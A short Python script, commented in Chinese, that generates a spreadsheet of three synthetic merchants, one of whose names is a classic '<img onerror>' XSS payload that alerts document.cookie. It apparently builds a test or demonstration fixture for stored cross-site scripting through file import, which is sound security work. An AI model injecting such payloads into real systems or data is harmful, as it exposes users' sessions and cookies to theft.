#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""make_xlsx.py
生成 merchants.xlsx：3 行合成商家数据，其中一行商家名是 XSS 载荷。
载荷刻意用经典 <img onerror> 形式，便于在截图里一眼看出。
"""
import os
from openpyxl import Workbook

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "merchants.xlsx")

XSS_PAYLOAD = "<img src=x onerror=alert('XSS:'+document.cookie)>"

rows = [
    ("商家名称", "地址", "电话"),
    (XSS_PAYLOAD, "建国路88号", "13800001234"),
    ("星巴克(国贸店)", "国贸中心一层", "010-65001111"),
    ("瑞幸咖啡(中关村店)", "中关村大街27号", "010-82502222"),
]

def main():
    wb = Workbook()
    ws = wb.active
    ws.title = "merchants"
    for r in rows:
        ws.append(r)
    # 列宽稍微调一下，方便截图
    ws.column_dimensions["A"].width = 42
    ws.column_dimensions["B"].width = 22
    ws.column_dimensions["C"].width = 16
    wb.save(OUT)
    print(f"[make] {OUT}  ({os.path.getsize(OUT)} bytes)")
    print(f"[payload] {XSS_PAYLOAD}")

if __name__ == "__main__":
    main()
